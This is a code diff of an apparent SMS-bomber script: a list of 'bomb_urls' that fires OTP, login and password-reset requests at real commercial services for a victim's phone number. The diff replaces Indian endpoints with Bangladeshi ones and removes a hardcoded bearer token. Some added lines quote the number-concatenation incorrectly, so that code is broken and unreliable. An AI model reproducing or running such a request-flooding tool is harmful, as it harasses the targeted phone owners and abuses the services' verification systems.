@@ -7,21 +7,14 @@ class Api:
         self.number = number
         bomb_urls = [
             {
-                'url': 'https://api.apollo247.com/graphql',
+                'url': 'https://api.ajkerdeal.com/Recover/RetrivePassword/customersignup=null',
                 'headers': {
-                    "accept": "*/*",
-                    "authorization": "Bearer 3d1833da7020e0602165529446587434",
-                    "Content-Type": "application/json",
-                    "Host": "api.apollo247.com",
-                    "Connection": "Keep-Alive",
-                    "Accept-Encoding": "gzip",
-                    "User-Agent": "okhttp/3.12.1",
-                    "Content-Length": "357"
+                    "Content-Type": "application/json"
                 },
-                'json': {"operationName":"Login","variables":{"mobileNumber":"+91"+str(self.number),"loginType":"PATIENT","hashCode":"XZNKZ3TUKDO"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!, $hashCode: String) {\n  login(mobileNumber: $mobileNumber, loginType: $loginType, hashCode: $hashCode) {\n    status\n    message\n    loginId\n    __typename\n  }\n}\n"}
+                'json': {"CustomerId": "01833268701","MobileOrEmail":"'+str(self.number)+'", "Type": 2}
             },
             {
-                'url': 'https://www.snapdeal.com/sendOTP?emailId=&mobileNumber='+str(self.number)+'&purpose=LOGIN_WITH_MOBILE_OTP',
+                'url': 'http://www.cinespot.mobi/api/cinespot/v1/otp/sms/mobile-'+str(self.number)+'/operator-All/send',
             },
             {
                 'url': 'https://api.dominos.co.in/loginhandler/forgotpassword',
@@ -150,11 +143,11 @@ class Api:
                 },
             },
             {
-                "url": "https://api.nnnow.com/d/api/appDownloadLink",
+                "url": "http://27.131.15.19/lstyle/api/lsotprequest",
                 "headers": {
-                    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
+                    "content-type": "application/json",
                 },
-                "data": {"mobileNumber": str(self.number)},
+                "data": {"shortcode":"2494905","msisdn":"88'+str(self.number)+'"},
             },
         ]
 
